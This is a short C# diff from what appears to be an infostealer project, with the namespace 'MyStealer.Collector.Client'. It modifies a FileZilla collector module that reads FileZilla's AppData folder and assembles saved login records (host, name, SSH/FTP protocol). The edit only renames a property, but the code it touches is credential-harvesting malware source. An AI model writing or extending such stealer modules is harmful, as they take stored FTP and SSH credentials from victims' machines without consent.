@@ -13,7 +13,7 @@ namespace MyStealer.Collector.Client
     /// </summary>
     public class FileZilla : ClientCollector
     {
-        public override string ModuleName => "FileZilla";
+        public override string Name => "FileZilla";
 
         private static readonly string dataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
 
@@ -60,7 +60,7 @@ namespace MyStealer.Collector.Client
                             count++;
                             set.Add(new ClientLogin
                             {
-                                ProgramName = ModuleName,
+                                ProgramName = Name,
                                 Name = name,
                                 Host = host,
                                 Protocol = protocol == 1 ? LoginProtocol.SSH : LoginProtocol.FTP,
